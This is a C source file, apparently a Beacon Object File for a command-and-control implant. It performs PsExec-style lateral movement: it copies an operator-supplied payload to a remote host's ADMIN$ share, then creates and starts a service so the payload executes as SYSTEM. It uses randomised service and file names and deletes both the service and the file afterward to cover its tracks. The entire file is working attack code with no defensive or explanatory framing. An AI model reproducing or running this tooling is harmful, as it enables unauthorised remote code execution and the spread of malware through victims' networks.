/*
 * psexec.c — PsExec-style lateral movement
 *
 * Flow:
 *   1. Write payload binary to \\target\ADMIN$\<filename>.exe
 *   2. OpenSCManagerW(target) → CreateServiceW(binPath=C:\Windows\<filename>.exe)
 *   3. StartServiceW → command executes as SYSTEM
 *   4. DeleteService + delete remote file
 *
 * The payload binary is sent from the operator as part of the task arguments.
 */
#include <windows.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceW(
    SC_HANDLE, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD, DWORD,
    LPCWSTR, LPCWSTR, LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

DECLSPEC_IMPORT int __cdecl MSVCRT$rand(void);
DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT int __cdecl MSVCRT$sprintf(char*, const char*, ...);

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *target       = BeaconDataExtract(&parser, NULL);
    int payload_len    = 0;
    char *payload_data = BeaconDataExtract(&parser, &payload_len);
    char *servicename  = BeaconDataExtract(&parser, NULL);
    char *remotepath   = BeaconDataExtract(&parser, NULL);

    if (!target || !*target) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Usage: psexec --target HOST --payload PATH\n");
        return;
    }

    if (!payload_data || payload_len <= 0) {
        BeaconPrintf(CALLBACK_ERROR, "[!] No payload data received\n");
        return;
    }

    /* Convert target to wide */
    wchar_t wTarget[256] = {0};
    MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);

    /* Generate random names if not provided */
    MSVCRT$srand((unsigned int)GetTickCount());

    wchar_t wSvcName[64] = {0};
    if (servicename && *servicename) {
        MultiByteToWideChar(CP_UTF8, 0, servicename, -1, wSvcName, 64);
    } else {
        MSVCRT$swprintf(wSvcName, 64, L"svc_%04x%04x",
            MSVCRT$rand() & 0xFFFF, MSVCRT$rand() & 0xFFFF);
    }

    wchar_t wRemoteFile[128] = {0};
    if (remotepath && *remotepath) {
        MultiByteToWideChar(CP_UTF8, 0, remotepath, -1, wRemoteFile, 128);
    } else {
        MSVCRT$swprintf(wRemoteFile, 128, L"%04x%04x.exe",
            MSVCRT$rand() & 0xFFFF, MSVCRT$rand() & 0xFFFF);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] psexec: deploying %d bytes to \\\\%s\\ADMIN$\\%S\n",
                 payload_len, target, wRemoteFile);

    /* Step 1: Write payload to \\target\ADMIN$\filename.exe */
    wchar_t uncPath[512] = {0};
    MSVCRT$swprintf(uncPath, 512, L"\\\\%s\\ADMIN$\\%s", wTarget, wRemoteFile);

    HANDLE hFile = CreateFileW(uncPath, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to write to %S: %lu\n",
                     uncPath, GetLastError());
        return;
    }

    DWORD written = 0;
    WriteFile(hFile, payload_data, (DWORD)payload_len, &written, NULL);
    CloseHandle(hFile);

    if ((int)written != payload_len) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Incomplete write: %lu / %d bytes\n",
                     written, payload_len);
        DeleteFileW(uncPath);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Payload written (%lu bytes)\n", written);

    /* Step 2: Create service pointing to C:\Windows\filename.exe */
    wchar_t binPath[512] = {0};
    MSVCRT$swprintf(binPath, 512, L"C:\\Windows\\%s", wRemoteFile);

    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(wTarget, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManagerW failed: %lu\n", GetLastError());
        DeleteFileW(uncPath);
        return;
    }

    SC_HANDLE hSvc = ADVAPI32$CreateServiceW(
        hSCM, wSvcName, wSvcName,
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        binPath,
        NULL, NULL, NULL, NULL, NULL);

    if (!hSvc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] CreateServiceW failed: %lu\n", GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        DeleteFileW(uncPath);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Service '%S' created (binPath: %S)\n",
                 wSvcName, binPath);

    /* Step 3: Start service */
    BOOL started = ADVAPI32$StartServiceW(hSvc, 0, NULL);
    if (!started) {
        DWORD err = GetLastError();
        if (err == 1053) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Payload executed (service timeout expected)\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] StartServiceW failed: %lu\n", err);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started\n");
    }

    /* Step 4: Cleanup — delete service and remote file */
    ADVAPI32$DeleteService(hSvc);
    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hSCM);

    /* Give service a moment to start before deleting the binary */
    Sleep(2000);

    if (DeleteFileW(uncPath)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Remote file deleted\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to delete %S: %lu (manual cleanup needed)\n",
                     uncPath, GetLastError());
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] psexec complete\n");
}
